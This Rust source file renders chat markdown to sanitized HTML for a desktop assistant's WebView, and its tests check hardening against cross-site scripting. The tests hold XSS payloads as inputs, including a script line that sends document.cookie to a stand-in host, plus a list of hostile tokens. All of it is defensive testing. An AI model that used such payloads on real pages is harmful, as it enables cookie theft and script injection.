use std::sync::OnceLock;

use base64::Engine as _;
use desktop_assistant_client_common::MessageKind;
use pulldown_cmark::{Options, Parser, html};
use sha2::{Digest, Sha256};

/// Convert markdown text to HTML and sanitize the result.
///
/// Two reasons to sanitize after `pulldown_cmark` rather than before:
///
/// 1. Raw HTML embedded in markdown (`<script>...</script>`, `<img onerror=...>`,
///    `<a href="javascript:...">`) is emitted verbatim by `pulldown_cmark`'s
///    HTML renderer. Stripping `Event::Html` / `Event::InlineHtml` works for
///    block-form attacks but loses adjacent legitimate text when the attacker
///    puts both on one line (e.g. `<script>x</script>hello` — pulldown-cmark
///    treats the entire run as a single HTML block). [`ammonia`] parses the
///    rendered HTML and strips dangerous constructs while preserving text.
/// 2. `ammonia`'s default builder whitelists the exact tags markdown produces
///    (headings, lists, code, links with safe URL schemes, etc.) and removes
///    event handlers, `<script>`, `<style>`, `<iframe>`, `<form>`, and any
///    `href` / `src` whose scheme isn't in the safe allowlist.
///
/// Combined with the SHA-256-pinned CSP `script-src` in [`html_template`],
/// this gives two independent layers against hostile assistant output —
/// see issue #25.
pub fn markdown_to_html(input: &str) -> String {
    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_STRIKETHROUGH);
    options.insert(Options::ENABLE_TASKLISTS);

    let parser = Parser::new_ext(input, options);
    let mut raw = String::new();
    html::push_html(&mut raw, parser);

    ammonia::clean(&raw)
}

/// Avatar URLs to embed in chat message rendering.
pub struct AvatarUrls {
    pub adele: String,
    pub user: String,
}

/// HTML-encode characters that are significant in attribute values.
fn html_escape_attr(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('"', "&quot;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

fn avatar_img(url: &str, alt: &str) -> String {
    if url.is_empty() {
        // `&alt[..1]` panics on multibyte chars (e.g. emoji). Use char-based
        // indexing and fall back to '?' on empty input. Issue #25.
        let initial = alt.chars().next().unwrap_or('?');
        format!(r#"<div class="avatar avatar-fallback">{initial}</div>"#)
    } else {
        let safe_url = html_escape_attr(url);
        let safe_alt = html_escape_attr(alt);
        format!(r#"<img class="avatar" src="{safe_url}" alt="{safe_alt}">"#)
    }
}

/// Render a full set of chat messages into an HTML document body.
pub fn render_messages_html(
    messages: &[(String, String, MessageKind)],
    streaming_buffer: Option<&str>,
    avatars: &AvatarUrls,
) -> String {
    let mut html = String::new();

    for (role, content, kind) in messages {
        let (class, label, avatar_html) = match role.as_str() {
            "user" => (
                "message user-message",
                "You".to_string(),
                avatar_img(&avatars.user, "You"),
            ),
            "assistant" => (
                "message assistant-message",
                // Badge a Spoken / SpeechDisabled say_this line from the explicit
                // metadata (voice#126) — never by parsing the content.
                format!("Adele{}", crate::widgets::chat_view::kind_marker(*kind)),
                avatar_img(&avatars.adele, "Adele"),
            ),
            _ => ("message", String::new(), String::new()),
        };

        let content_html = markdown_to_html(content);
        html.push_str(&format!(
            r#"<div class="{class}">{avatar_html}<div class="bubble"><div class="label">{label}</div><div class="content">{content_html}</div></div></div>"#
        ));
    }

    if let Some(buffer) = streaming_buffer
        && !buffer.is_empty()
    {
        let content_html = markdown_to_html(buffer);
        let avatar_html = avatar_img(&avatars.adele, "Adele");
        html.push_str(&format!(
                r#"<div class="message assistant-message streaming">{avatar_html}<div class="bubble"><div class="label">Adele</div><div class="content">{content_html}<span class="cursor">▌</span></div></div></div>"#
            ));
    }

    html
}

/// Inline JavaScript body that powers the chat WebView.
///
/// The bytes here are hashed at startup and pinned via CSP `script-src
/// 'sha256-...'` so the WebView refuses to execute anything else — see
/// [`html_template`] and issue #25. Editing this string changes the hash;
/// the `csp_script_hash_matches_inline_script_body` test will catch drift.
const INLINE_SCRIPT: &str = r#"
function updateMessages(html) {
    document.getElementById('messages').innerHTML = html;
    scrollToBottom();
}

function appendChunk(text) {
    // Find streaming message or create one
    let streaming = document.querySelector('.streaming .content');
    if (!streaming) {
        let div = document.createElement('div');
        div.className = 'message assistant-message streaming';
        // Re-use the Adele avatar from the last assistant message, or use fallback
        let existingAvatar = document.querySelector('.assistant-message .avatar');
        let avatarHtml = existingAvatar
            ? existingAvatar.outerHTML
            : '<div class="avatar avatar-fallback">A</div>';
        div.innerHTML = avatarHtml + '<div class="bubble"><div class="label">Adele</div><div class="content"></div></div>';
        document.getElementById('messages').appendChild(div);
        streaming = div.querySelector('.content');
    }
    // Append raw text (for streaming, we accumulate and re-render on complete)
    streaming.textContent += text;
    scrollToBottom();
}

function setStatus(message) {
    let el = document.getElementById('status-indicator');
    document.getElementById('status-text').textContent = message;
    el.classList.add('visible');
    scrollToBottom();
}

function clearStatus() {
    document.getElementById('status-indicator').classList.remove('visible');
}

function scrollToBottom() {
    window.scrollTo(0, document.body.scrollHeight);
}
"#;

/// Compute the CSP `'sha256-...'` source expression for the inline script
/// body. Cached after the first call so callers keep cheap `&'static str`
/// semantics.
fn inline_script_csp_hash() -> &'static str {
    static HASH: OnceLock<String> = OnceLock::new();
    HASH.get_or_init(|| {
        let digest = Sha256::digest(INLINE_SCRIPT.as_bytes());
        let b64 = base64::engine::general_purpose::STANDARD.encode(digest);
        format!("'sha256-{b64}'")
    })
}

/// Full HTML page template with embedded CSS.
///
/// CSP `script-src` is locked to the SHA-256 hash of [`INLINE_SCRIPT`] — no
/// `'unsafe-inline'`, no `'unsafe-eval'`, no remote scripts. Combined with
/// the raw-HTML stripping in [`markdown_to_html`], a hostile assistant
/// message cannot execute JavaScript in the chat WebView. See issue #25.
pub fn html_template() -> &'static str {
    static TEMPLATE: OnceLock<String> = OnceLock::new();
    TEMPLATE.get_or_init(|| {
        let script_hash = inline_script_csp_hash();
        format!(
            r##"<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data: file:; script-src {script_hash};">
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}

body {{
    background: #1a1d2e;
    color: #e0e0e0;
    font-family: system-ui, -apple-system, sans-serif;
    font-size: 14px;
    line-height: 1.6;
    padding: 16px;
}}

#messages {{
    display: flex;
    flex-direction: column;
    gap: 16px;
}}

.message {{
    display: flex;
    align-items: flex-start;
    gap: 10px;
}}

.avatar {{
    width: 28px;
    height: 28px;
    min-width: 28px;
    border-radius: 50%;
    object-fit: cover;
    object-position: center 15%;
    margin-top: 2px;
}}

.avatar-fallback {{
    background: #3a3f5c;
    color: #9ca3af;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 600;
    font-size: 13px;
}}

.bubble {{
    flex: 1;
    min-width: 0;
    border-radius: 8px;
    padding: 12px 16px;
}}

.user-message .bubble {{
    background: rgba(255, 189, 89, 0.08);
    border-left: 3px solid #ffbd59;
}}

.user-message .label {{
    color: #ffbd59;
    font-weight: 600;
    margin-bottom: 4px;
}}

.assistant-message .bubble {{
    background: rgba(92, 206, 154, 0.08);
    border-left: 3px solid #5cce9a;
}}

.assistant-message .label {{
    color: #5cce9a;
    font-weight: 600;
    margin-bottom: 4px;
}}

.assistant-message.streaming .bubble {{
    border-left-color: #84dac1;
}}

.assistant-message.streaming .label {{
    color: #84dac1;
}}

.content p {{ margin: 0.5em 0; }}
.content p:first-child {{ margin-top: 0; }}
.content p:last-child {{ margin-bottom: 0; }}

.content pre {{
    background: #232740;
    border-radius: 6px;
    padding: 12px;
    overflow-x: auto;
    margin: 0.5em 0;
}}

.content code {{
    font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
    font-size: 13px;
}}

.content :not(pre) > code {{
    background: #232740;
    padding: 2px 6px;
    border-radius: 3px;
}}

.content ul, .content ol {{
    padding-left: 1.5em;
    margin: 0.5em 0;
}}

.content table {{
    border-collapse: collapse;
    margin: 0.5em 0;
}}

.content th, .content td {{
    border: 1px solid #3a3f5c;
    padding: 6px 12px;
}}

.content th {{
    background: #232740;
}}

.content a {{
    color: #7aa3ff;
    text-decoration: none;
}}

.content a:hover {{
    text-decoration: underline;
}}

.cursor {{
    color: #84dac1;
    animation: blink 1s step-end infinite;
}}

@keyframes blink {{
    50% {{ opacity: 0; }}
}}

#status-indicator {{
    display: none;
    padding: 8px 16px;
    color: #9ca3af;
    font-size: 13px;
    font-style: italic;
}}

#status-indicator.visible {{
    display: flex;
    align-items: center;
    gap: 8px;
}}

#status-indicator .dot {{
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: #84dac1;
    animation: pulse 1.5s ease-in-out infinite;
}}

@keyframes pulse {{
    0%, 100% {{ opacity: 0.4; }}
    50% {{ opacity: 1; }}
}}

/* Light theme. WebKitGTK resolves `prefers-color-scheme` from the system color
   scheme (the `org.freedesktop.appearance color-scheme` portal), so this block
   applies whenever the desktop is not in dark mode. The
   dark palette above remains the default; these rules override only the
   colour-bearing properties so chat content stays legible and on-brand in
   light mode. Mirrors the GTK light palette in `style-light.css`:
   bg #1a1d2e->#ffffff, fg #e0e0e0->#1a1d2e, surface #232740->#f0f2f7,
   border #3a3f5c->#cdd3e0, user accent #ffbd59->#9a6b00,
   assistant accent #5cce9a->#178a6e, link #7aa3ff->#2456c8. */
@media (prefers-color-scheme: light) {{
    body {{
        background: #ffffff;
        color: #1a1d2e;
    }}

    .avatar-fallback {{
        background: #d6dae6;
        color: #555c6b;
    }}

    .user-message .bubble {{
        background: rgba(154, 107, 0, 0.07);
        border-left-color: #9a6b00;
    }}

    .user-message .label {{
        color: #9a6b00;
    }}

    .assistant-message .bubble {{
        background: rgba(23, 138, 110, 0.07);
        border-left-color: #178a6e;
    }}

    .assistant-message .label {{
        color: #178a6e;
    }}

    .assistant-message.streaming .bubble {{
        border-left-color: #1f9e7c;
    }}

    .assistant-message.streaming .label {{
        color: #1f9e7c;
    }}

    .content pre {{
        background: #f0f2f7;
    }}

    .content :not(pre) > code {{
        background: #f0f2f7;
    }}

    .content th, .content td {{
        border: 1px solid #cdd3e0;
    }}

    .content th {{
        background: #f0f2f7;
    }}

    .content a {{
        color: #2456c8;
    }}

    .cursor {{
        color: #1f9e7c;
    }}

    #status-indicator {{
        color: #555c6b;
    }}

    #status-indicator .dot {{
        background: #1f9e7c;
    }}
}}
</style>
</head>
<body>
<div id="messages"></div>
<div id="status-indicator"><span class="dot"></span><span id="status-text"></span></div>
<script>{INLINE_SCRIPT}</script>
</body>
</html>"##
        )
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn basic_markdown_conversion() {
        let html = markdown_to_html("**bold** and *italic*");
        assert!(html.contains("<strong>bold</strong>"));
        assert!(html.contains("<em>italic</em>"));
    }

    #[test]
    fn code_block_conversion() {
        let md = "```rust\nfn main() {}\n```";
        let html = markdown_to_html(md);
        assert!(html.contains("<code"));
        assert!(html.contains("fn main()"));
    }

    fn test_avatars() -> AvatarUrls {
        AvatarUrls {
            adele: "file:///tmp/adele.png".to_string(),
            user: "file:///tmp/user.png".to_string(),
        }
    }

    #[test]
    fn render_messages_produces_html() {
        let messages = vec![
            ("user".to_string(), "Hello".to_string(), MessageKind::Normal),
            (
                "assistant".to_string(),
                "Hi there!".to_string(),
                MessageKind::Normal,
            ),
        ];
        let html = render_messages_html(&messages, None, &test_avatars());
        assert!(html.contains("user-message"));
        assert!(html.contains("assistant-message"));
        assert!(html.contains("Hello"));
        assert!(html.contains("Hi there!"));
    }

    #[test]
    fn render_with_streaming_buffer() {
        let messages = vec![];
        let html = render_messages_html(&messages, Some("Partial..."), &test_avatars());
        assert!(html.contains("streaming"));
        assert!(html.contains("Partial..."));
        assert!(html.contains("cursor"));
    }

    #[test]
    fn render_messages_includes_avatar_images() {
        let messages = vec![
            ("user".to_string(), "Hi".to_string(), MessageKind::Normal),
            (
                "assistant".to_string(),
                "Hello".to_string(),
                MessageKind::Normal,
            ),
        ];
        let html = render_messages_html(&messages, None, &test_avatars());
        assert!(html.contains(r#"src="file:///tmp/user.png""#));
        assert!(html.contains(r#"src="file:///tmp/adele.png""#));
    }

    #[test]
    fn render_messages_fallback_avatar_when_empty() {
        let avatars = AvatarUrls {
            adele: "file:///tmp/adele.png".to_string(),
            user: String::new(),
        };
        let messages = vec![("user".to_string(), "Hi".to_string(), MessageKind::Normal)];
        let html = render_messages_html(&messages, None, &avatars);
        assert!(html.contains("avatar-fallback"));
        assert!(html.contains(">Y</div>")); // "Y" from "You"
    }

    #[test]
    fn html_template_is_valid() {
        let template = html_template();
        assert!(template.contains("<!DOCTYPE html>"));
        assert!(template.contains("updateMessages"));
        assert!(template.contains("#messages"));
    }

    #[test]
    fn html_template_includes_csp() {
        let template = html_template();
        assert!(template.contains("Content-Security-Policy"));
        assert!(template.contains("default-src 'none'"));
    }

    #[test]
    fn avatar_img_escapes_html_in_attributes() {
        let html = avatar_img(r#"x" onload="alert(1)"#, "test");
        assert!(!html.contains(r#"onload="alert"#));
        assert!(html.contains("&quot;"));
    }

    #[test]
    fn avatar_img_allows_safe_urls() {
        let html = avatar_img("data:image/png;base64,abc", "User");
        assert!(html.contains("data:image/png;base64,abc"));

        let html = avatar_img("file:///tmp/avatar.png", "User");
        assert!(html.contains("file:///tmp/avatar.png"));
    }

    // --- Issue #25: markdown XSS hardening ---

    #[test]
    fn raw_script_tag_in_assistant_markdown_is_stripped() {
        let html = markdown_to_html("<script>alert(1)</script>hello");
        assert!(
            html.contains("hello"),
            "legitimate text after raw HTML must survive, got: {html:?}"
        );
        assert!(
            !html.to_ascii_lowercase().contains("<script"),
            "raw <script> tag must be stripped from output, got: {html:?}"
        );
        assert!(
            !html.contains("alert(1)"),
            "script body must not appear verbatim in output, got: {html:?}"
        );
    }

    #[test]
    fn raw_img_with_onerror_in_assistant_markdown_is_stripped() {
        // The issue's acceptance criterion: "no onerror, no <img> (unless
        // ammonia preserves images, in which case no onerror)". We chose
        // ammonia, which keeps <img> with a safe src — what must vanish is
        // the executable event handler.
        let html = markdown_to_html("before <img src=x onerror=\"alert(1)\"> after");
        assert!(
            html.contains("before"),
            "leading text must survive: {html:?}"
        );
        assert!(
            html.contains("after"),
            "trailing text must survive: {html:?}"
        );
        assert!(
            !html.to_ascii_lowercase().contains("onerror"),
            "onerror handler must never appear in output: {html:?}"
        );
        assert!(
            !html.to_ascii_lowercase().contains("alert(1)"),
            "script body must not survive: {html:?}"
        );
    }

    #[test]
    fn raw_inline_html_anchor_with_javascript_uri_is_stripped() {
        // The link text and surrounding markdown must survive, but the
        // `javascript:` href is the executable part — that's what has to go.
        // ammonia's default URL scheme allowlist (http/https/mailto/etc.)
        // strips the dangerous href; the inert <a> tag may remain.
        let html = markdown_to_html("click <a href=\"javascript:alert(1)\">me</a> now");
        assert!(
            !html.to_ascii_lowercase().contains("javascript:"),
            "javascript: URIs must be stripped: {html:?}"
        );
        assert!(
            html.contains("click"),
            "surrounding text must survive: {html:?}"
        );
        assert!(
            html.contains("now"),
            "surrounding text must survive: {html:?}"
        );
        assert!(html.contains("me"), "link text must survive: {html:?}");
    }

    #[test]
    fn legitimate_markdown_formatting_still_renders() {
        let md = "# Heading\n\n**bold** and *italic* and `code`.\n\n\
                  - item 1\n- item 2\n\n\
                  > quoted\n\n\
                  [link](https://example.com)";
        let html = markdown_to_html(md);
        assert!(
            html.contains("<h1>Heading</h1>"),
            "headings render: {html:?}"
        );
        assert!(
            html.contains("<strong>bold</strong>"),
            "bold renders: {html:?}"
        );
        assert!(html.contains("<em>italic</em>"), "italic renders: {html:?}");
        assert!(
            html.contains("<code>code</code>"),
            "inline code renders: {html:?}"
        );
        assert!(
            html.contains("<ul>") && html.contains("<li>item 1</li>"),
            "lists render: {html:?}"
        );
        assert!(
            html.contains("<blockquote>"),
            "blockquotes render: {html:?}"
        );
        // ammonia adds rel="noopener noreferrer" to <a> tags, so assert
        // the load-bearing attributes/text rather than the full tag string.
        assert!(
            html.contains(r#"href="https://example.com""#),
            "markdown link href renders: {html:?}"
        );
        assert!(
            html.contains(">link</a>"),
            "markdown link text renders: {html:?}"
        );
    }

    #[test]
    fn csp_does_not_allow_inline_script() {
        let template = html_template();
        // Find the CSP meta tag and inspect the script-src directive.
        let csp_start = template
            .find("Content-Security-Policy")
            .expect("template has CSP meta tag");
        let after = &template[csp_start..];
        let content_start =
            after.find("content=\"").expect("CSP has content attr") + "content=\"".len();
        let content_end = content_start
            + after[content_start..]
                .find('"')
                .expect("CSP content closes");
        let csp = &after[content_start..content_end];

        // Find the script-src directive specifically.
        let script_src = csp
            .split(';')
            .map(str::trim)
            .find(|d| d.starts_with("script-src"))
            .expect("CSP defines script-src");

        assert!(
            !script_src.contains("'unsafe-inline'"),
            "script-src must not include 'unsafe-inline'; got: {script_src:?}"
        );
        assert!(
            !script_src.contains("'unsafe-eval'"),
            "script-src must not include 'unsafe-eval'; got: {script_src:?}"
        );
        // Must allow our scroll/copy/clipboard helpers via a hash or 'self', not inline.
        assert!(
            script_src.contains("'sha256-") || script_src.contains("'self'"),
            "script-src must allow scripts via hash or self only; got: {script_src:?}"
        );
    }

    #[test]
    fn csp_script_hash_matches_inline_script_body() {
        // The CSP sha256 hash MUST equal the SHA-256 of the inline <script> body.
        // If they drift, the WebView silently refuses to run the script and the
        // chat UI stops updating — this test pins them together.
        let template = html_template();
        let script_open = template
            .find("<script>")
            .expect("template has inline script");
        let body_start = script_open + "<script>".len();
        let body_end = body_start
            + template[body_start..]
                .find("</script>")
                .expect("inline script closes");
        let body = &template[body_start..body_end];

        use base64::Engine as _;
        use sha2::{Digest, Sha256};
        let digest = Sha256::digest(body.as_bytes());
        let expected = format!(
            "'sha256-{}'",
            base64::engine::general_purpose::STANDARD.encode(digest)
        );

        assert!(
            template.contains(&expected),
            "CSP must contain hash {expected} that matches inline script body"
        );
    }

    #[test]
    fn multibyte_alt_text_does_not_panic() {
        // Regression: avatar_img used `&alt[..1]` which panics on multibyte chars.
        let html = avatar_img("", "\u{1F600}smile"); // grinning face emoji
        // We only assert it doesn't panic and produces a fallback div; the exact
        // glyph chosen is an implementation detail of the fix.
        assert!(
            html.contains("avatar-fallback"),
            "expected fallback avatar markup, got: {html:?}"
        );

        // Also exercise via render_messages_html with an empty avatar URL,
        // which is the actual call site that would have crashed.
        let avatars = AvatarUrls {
            adele: String::new(),
            user: String::new(),
        };
        // Role labels in render_messages_html are ASCII ("You" / "Adele"),
        // so to trigger the original bug we exercise avatar_img directly above.
        let messages = vec![(
            "assistant".to_string(),
            "hi".to_string(),
            MessageKind::Normal,
        )];
        let _ = render_messages_html(&messages, None, &avatars);
    }

    #[test]
    fn business_outcome_hostile_assistant_message_does_not_execute_js() {
        // End-to-end-ish: a hostile assistant turn flows through the full
        // markdown → message HTML pipeline. Nothing reaching the WebView
        // should permit JS execution.
        let hostile = "Sure, here is a tip:\n\n\
                       <script>fetch('https://evil.example/'+document.cookie)</script>\n\n\
                       <img src=x onerror=\"alert('pwn')\">\n\n\
                       <iframe src=\"javascript:alert(1)\"></iframe>\n\n\
                       <a href=\"javascript:alert(1)\" onclick=\"alert(2)\">click</a>\n\n\
                       Bye!";
        let messages = vec![(
            "assistant".to_string(),
            hostile.to_string(),
            MessageKind::Normal,
        )];
        let html = render_messages_html(&messages, None, &test_avatars());

        // Legitimate content survives.
        assert!(html.contains("Sure, here is a tip"), "leading text: {html}");
        assert!(html.contains("Bye!"), "trailing text: {html}");

        // No executable HTML constructs reach the rendered output. (We do
        // not forbid `<img ` here because our own avatar markup is an <img>;
        // ammonia strips event handlers from any other <img> the assistant
        // tried to inject, which is what matters for execution.)
        let lower = html.to_ascii_lowercase();
        for bad in [
            "<script",
            "onerror",
            "onclick",
            "onload",
            "javascript:",
            "<iframe",
            "alert(",
        ] {
            assert!(
                !lower.contains(bad),
                "hostile token {bad:?} must not appear in rendered HTML; got: {html}"
            );
        }
    }
}
